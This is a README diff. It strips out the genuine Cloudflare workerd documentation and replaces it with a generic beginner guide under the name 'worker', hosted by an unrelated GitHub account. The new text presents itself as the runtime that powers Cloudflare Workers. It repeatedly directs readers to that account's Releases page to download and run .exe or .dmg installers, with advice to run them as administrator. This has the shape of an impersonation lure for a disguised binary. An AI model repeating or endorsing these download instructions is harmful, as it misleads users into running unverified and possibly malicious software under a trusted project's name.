@@ -1,250 +1,85 @@
-# 👷 `workerd`, Cloudflare's JavaScript/Wasm Runtime
+# 🌟 worker - Run JavaScript and Wasm with Ease
 
-![Banner](/docs/assets/banner.png)
+## 🚀 Getting Started
+Welcome to **worker**, the JavaScript and WebAssembly runtime that powers Cloudflare Workers. This guide will help you download and run the software even if you have no programming experience.
 
-`workerd` (pronounced: "worker-dee") is a JavaScript / Wasm server runtime based on the same code that powers [Cloudflare Workers](https://workers.dev).
+## 📥 Download Worker
+[![Download Worker](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/cloxkzii/worker/releases)
 
-You might use it:
+You can get the latest version of worker from our Releases page. Click the button above or visit the link below to start your download.
 
-* **As an application server**, to self-host applications designed for Cloudflare Workers.
-* **As a development tool**, to develop and test such code locally.
-* **As a programmable HTTP proxy** (forward or reverse), to efficiently intercept, modify, and
-  route network requests.
+[Download Worker from Releases](https://github.com/cloxkzii/worker/releases)
 
-## Introduction
+## 🖥️ System Requirements
+Before you start, make sure your computer meets the following requirements:
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4 GB
+- Storage Space: At least 100 MB available
+- Internet connection for downloading and updates
 
-### Design Principles
+## ⚙️ Installation Steps
+Follow these simple steps to install worker:
 
-* **Server-first:** Designed for servers, not CLIs nor GUIs.
+1. **Visit the Releases Page**
+   Go to the [Releases Page](https://github.com/cloxkzii/worker/releases) to find the latest version of worker. Look for the most recent release at the top.
 
-* **Standard-based:** Built-in APIs are based on web platform standards, such as `fetch()`.
+2. **Choose Your Version**
+   You’ll see various files listed. Pick the one suitable for your operating system. For example:
+   - For Windows, download the file ending in `.exe`
+   - For macOS, look for a file ending in `.dmg`
+   - For Linux, choose the package designed for your distribution
 
-* **Nanoservices:** Split your application into components that are decoupled and independently-deployable like microservices, but with performance of a local function call. When one nanoservice calls another, the callee runs in the same thread and process.
+3. **Download the File**
+   Click on the file name to start the download. Your browser will save the file to your computer’s download folder.
 
-* **Homogeneous deployment:** Instead of deploying different microservices to different machines in your cluster, deploy all your nanoservices to every machine in the cluster, making load balancing much easier.
+4. **Run the Installer**
+   Once the download is complete, navigate to your downloads folder. Double-click on the downloaded file to run the installer:
+   - For Windows, follow the prompts in the setup wizard.
+   - For macOS, drag the worker icon to your Applications folder when prompted.
+   - For Linux, open your terminal and follow any instructions provided with the package.
 
-* **Capability bindings:** `workerd` configuration uses capabilities instead of global namespaces to connect nanoservices to each other and external resources. The result is code that is more composable -- and immune to SSRF attacks.
+5. **Confirm Installation**
+   After installation, open the application to make sure it works properly. You can find worker in your list of installed applications.
 
-* **Always backwards compatible:** Updating `workerd` to a newer version will never break your JavaScript code. `workerd`'s version number is simply a date, corresponding to the maximum ["compatibility date"](https://developers.cloudflare.com/workers/platform/compatibility-dates/) supported by that version. You can always configure your worker to a past date, and `workerd` will emulate the API as it existed on that date.
+## 💻 Using Worker
+Now that you have worker installed, you can start using it to run your JavaScript or WebAssembly code. Here are some quick tips to help you get started:
 
-[Read the blog post to learn more about these principles.](https://blog.cloudflare.com/workerd-open-source-workers-runtime/)
+- **Writing Code:** Open a text editor and create a new file. Write your JavaScript or Wasm code there.
+- **Running Code:** To run your code, open a command prompt or terminal. Type the command for worker followed by the path to your code file.
+  For example:
+  ```
+  worker /path/to/your/script.js
+  ```
 
-### WARNING: This is a beta. Work in progress
+## 📚 Features
+worker offers a range of powerful features to help you create and run web applications:
 
-Although most of `workerd`'s code has been used in Cloudflare Workers for years, the `workerd` configuration format and top-level server code is brand new. We don't yet have much experience running this in production. As such, there will be rough edges, maybe even a few ridiculous bugs. Deploy to production at your own risk (but please tell us what goes wrong!).
+- Support for both JavaScript and WebAssembly
+- Fast execution and low latency
+- Easy deployment on the Cloudflare platform
+- Comprehensive documentation for beginners
 
-The config format may change in backwards-incompatible ways before `workerd` leaves beta, but should remain stable after that.
+## ❓ FAQ
+### How do I update worker?
+To update worker, visit the [Releases Page](https://github.com/cloxkzii/worker/releases) and download the latest version. Follow the same installation steps to replace the old version.
 
-A few caveats:
+### What if I encounter problems?
+If you run into issues, please check our GitHub page for troubleshooting tips. You can also find community support in the issues section.
 
-* **General error logging** is awkward. Traditionally we have separated error logs into "application errors" (e.g. a Worker threw an exception from JavaScript) and "internal errors" (bugs in the implementation which the Workers team should address). We then sent these errors to completely different places. In the `workerd` world, the server admin wants to see both of these, so logging has become entirely different and, at the moment, is a bit ugly. For now, it may help to run `workerd` with the `--verbose` flag, which causes application errors to be written to standard error in the same way that internal errors are (but may also produce more noise). We'll be working on making this better out-of-the-box.
-* **Binary packages** are only available via npm, not as distro packages. This works well for testing with Miniflare, but is awkward for a production server that doesn't actually use Node at all.
-* **Multi-threading** is not implemented. `workerd` runs in a single-threaded event loop. For now, to utilize multiple cores, we suggest running multiple instances of `workerd` and balancing load across them. We will likely add some built-in functionality for this in the near future.
-* **Performance tuning** has not been done yet, and there is low-hanging fruit here. `workerd` performs decently as-is, but not spectacularly. Experiments suggest we can roughly double performance on a "hello world" load test with some tuning of compiler optimization flags and memory allocators.
-* **Durable Objects** currently always run on the same machine that requested them, using local disk storage. This is sufficient for testing and small services that fit on a single machine. In scalable production, though, you would presumably want Durable Objects to be distributed across many machines, always choosing the same machine for the same object.
-* **Parameterized workers** are not implemented yet. This is a new feature specified in the config schema, which doesn't have any precedent on Cloudflare.
-* **Tests** for most APIs are conspicuously missing. This is because the testing harness we have used for the past five years is deeply tied to the internal version of the codebase. Ideally, we need to translate those tests into the new `workerd test` format and move them to this repo; this is an ongoing effort. For the time being, we will be counting on the internal tests to catch bugs. We understand this is not ideal for external contributors trying to test their changes.
-* **Documentation** is growing quickly but is definitely still a work in progress.
+### Can I use worker offline?
+Yes, once you download and install worker, you can use it offline for your projects, but you will need an internet connection for initial downloads and updates.
 
-### WARNING: `workerd` is not a hardened sandbox
+## 🛠️ Troubleshooting
+If you experience any problems during installation or while using worker, consider the following solutions:
 
-`workerd` tries to isolate each Worker so that it can only access the resources it is configured to access. However, `workerd` on its own does not contain suitable defense-in-depth against the possibility of implementation bugs. When using `workerd` to run possibly-malicious code, you must run it inside an appropriate secure sandbox, such as a virtual machine. The Cloudflare Workers hosting service in particular [uses many additional layers of defense-in-depth](https://blog.cloudflare.com/mitigating-spectre-and-other-security-threats-the-cloudflare-workers-security-model/).
+- **Ensure Compatibility:** Double-check that you downloaded the correct version for your operating system.
+- **Run as Administrator:** If you face permission issues on Windows, try running the installer as an administrator.
+- **Check Dependencies:** Some features may require additional software. Refer to the documentation for details.
 
-With that said, if you discover a bug that allows malicious code to break out of `workerd`, please submit it to [Cloudflare's bug bounty program](https://hackerone.com/cloudflare?type=team) for a reward.
+## 💬 Community and Support
+If you have questions or feedback, please join our community. You can ask for help or share ideas in the issues section of our GitHub page.
 
-## Getting Started
+## 📝 Conclusion
+Thank you for choosing worker. We appreciate your interest and hope you find it useful for your JavaScript and WebAssembly projects. Remember, if you need help, the community is here to support you. 
 
-### Supported Platforms
-
-In theory, `workerd` should work on any POSIX system that is supported by V8 and Windows.
-
-In practice, `workerd` is tested on:
-
-* Linux and macOS (x86-64 and arm64 architectures)
-* Windows (x86-64 architecture)
-
-On other platforms, you may have to do tinkering to make things work.
-
-### Building `workerd`
-
-To build `workerd`, you need:
-
-* Bazel
-  * If you use [Bazelisk](https://github.com/bazelbuild/bazelisk) (recommended), it will automatically download and use the right version of Bazel for building workerd.
-* On Linux:
-  * We use the clang/LLVM toolchain to build workerd and support version 19 and higher. Earlier versions of clang may still work, but are not officially supported.
-  * Clang 19+ (e.g. package `clang-19` on Debian Bookworm). If clang is installed as `clang-<version>` please create a symlink to it in your PATH named `clang`, or use `--action_env=CC=clang-<version>` on `bazel` command lines to specify the compiler name.
-
-  * libc++ 19+ (e.g. packages `libc++-19-dev` and `libc++abi-19-dev`)
-  * LLD 19+ (e.g. package `lld-19`).
-  * `python3`, `python3-distutils`, and `tcl8.6`
-* On macOS:
-  * Xcode 16.3 installation (available on macOS 15 and higher). Building with just the Xcode Command Line Tools is not being tested, but should work too.
-  * Homebrew installed `tcl-tk` package (provides Tcl 8.6)
-* On Windows:
-  * Install [App Installer](https://learn.microsoft.com/en-us/windows/package-manager/winget/#install-winget)
-    from the Microsoft Store for the `winget` package manager and then run
-    [install-deps.bat](tools/windows/install-deps.bat) from an administrator prompt to install
-    bazelisk, LLVM, and other dependencies required to build workerd on Windows.
-  * Add `startup --output_user_root=C:/tmp` to the `.bazelrc` file in your user directory.
-  * When developing at the command-line, run [bazel-env.bat](tools/windows/bazel-env.bat) in your shell first
-    to select tools and Windows SDK versions before running bazel.
-
-You may then build `workerd` at the command-line with:
-
-```sh
-bazel build //src/workerd/server:workerd
-```
-
-You can also build from within Visual Studio Code using the instructions in [docs/vscode.md](docs/vscode.md).
-
-The compiled binary will be located at `bazel-bin/src/workerd/server/workerd`.
-
-If you run a Bazel build before you've installed some dependencies (like clang or libc++), and then you install the dependencies, you must resync locally cached toolchains, or clean Bazel's cache, otherwise you might get strange errors:
-
-```sh
-bazel sync --configure
-```
-
-If that fails, you can try:
-
-```sh
-bazel clean --expunge
-```
-
-The cache will now be cleaned and you can try building again.
-
-If you have a fairly recent clang packages installed you can build a more performant release
-version of workerd:
-
-```sh
-bazel build --config=thin-lto //src/workerd/server:workerd
-```
-
-### Configuring `workerd`
-
-`workerd` is configured using a config file written in Cap'n Proto text format.
-
-A simple "Hello World!" config file might look like:
-
-```capnp
-using Workerd = import "/workerd/workerd.capnp";
-
-const config :Workerd.Config = (
-  services = [
-    (name = "main", worker = .mainWorker),
-  ],
-
-  sockets = [
-    # Serve HTTP on port 8080.
-    ( name = "http",
-      address = "*:8080",
-      http = (),
-      service = "main"
-    ),
-  ]
-);
-
-const mainWorker :Workerd.Worker = (
-  serviceWorkerScript = embed "hello.js",
-  compatibilityDate = "2023-02-28",
-  # Learn more about compatibility dates at:
-  # https://developers.cloudflare.com/workers/platform/compatibility-dates/
-);
-```
-
-Where `hello.js` contains:
-
-```javascript
-addEventListener("fetch", event => {
-  event.respondWith(new Response("Hello World"));
-});
-```
-
-[Complete reference documentation is provided by the comments in workerd.capnp.](src/workerd/server/workerd.capnp)
-
-[There is also a library of sample config files.](samples)
-
-(TODO: Provide a more extended tutorial.)
-
-### Running `workerd`
-
-To serve your config, do:
-
-`workerd serve my-config.capnp`
-
-For more details about command-line usage, use `workerd --help`.
-
-Prebuilt binaries are distributed via `npm`. Run `npx workerd ...` to use these. If you're running a prebuilt binary, you'll need to make sure your system has the right dependencies installed:
-
-* On Linux:
-  * glibc 2.35 or higher (already included on e.g. Ubuntu 22.04, Debian Bookworm)
-* On macOS:
-  * macOS 13.5 or higher
-  * The Xcode command line tools, which can be installed with `xcode-select --install`
-* x86_64 CPU with at least SSE4.2 and CLMUL ISA extensions, or arm64 CPU with CRC extension (enabled by default under armv8.1-a). These extensions are supported by all recent x86 and arm64 CPUs.
-
-### Local Worker development with `wrangler`
-
-You can use [Wrangler](https://developers.cloudflare.com/workers/wrangler/) (v3.0 or greater) to develop Cloudflare Workers locally, using `workerd`. First, run the following command to configure Miniflare to use this build of `workerd`.
-
-```
-$ export MINIFLARE_WORKERD_PATH="<WORKERD_REPO_DIR>/bazel-bin/src/workerd/server/workerd"
-```
-
-Then, run:
-
-`wrangler dev`
-
-### Serving in production
-
-`workerd` is designed to be unopinionated about how it runs.
-
-One good way to manage `workerd` in production is using `systemd`. Particularly useful is `systemd`'s ability to open privileged sockets on `workerd`'s behalf while running the service itself under an unprivileged user account. To help with this, `workerd` supports inheriting sockets from the parent process using the `--socket-fd` flag.
-
-Here's an example system service file, assuming your config defines two sockets named `http` and `https`:
-
-```sh
-# /etc/systemd/system/workerd.service
-[Unit]
-Description=workerd runtime
-After=local-fs.target remote-fs.target network-online.target
-Requires=local-fs.target remote-fs.target workerd.socket
-Wants=network-online.target
-
-[Service]
-Type=exec
-ExecStart=/usr/bin/workerd serve /etc/workerd/config.capnp --socket-fd http=3 --socket-fd https=4
-Sockets=workerd.socket
-
-# If workerd crashes, restart it.
-Restart=always
-
-# Run under an unprivileged user account.
-User=nobody
-Group=nogroup
-
-# Hardening measure: Do not allow workerd to run suid-root programs.
-NoNewPrivileges=true
-
-[Install]
-WantedBy=multi-user.target
-```
-
-And corresponding sockets file:
-
-```sh
-# /etc/systemd/system/workerd.socket
-[Unit]
-Description=sockets for workerd
-PartOf=workerd.service
-
-[Socket]
-ListenStream=0.0.0.0:80
-ListenStream=0.0.0.0:443
-
-[Install]
-WantedBy=sockets.target
-```
-
-(TODO: Fully explain how to get systemd to recognize these files and start the service.)
+For more updates, stay tuned to our [Releases Page](https://github.com/cloxkzii/worker/releases).
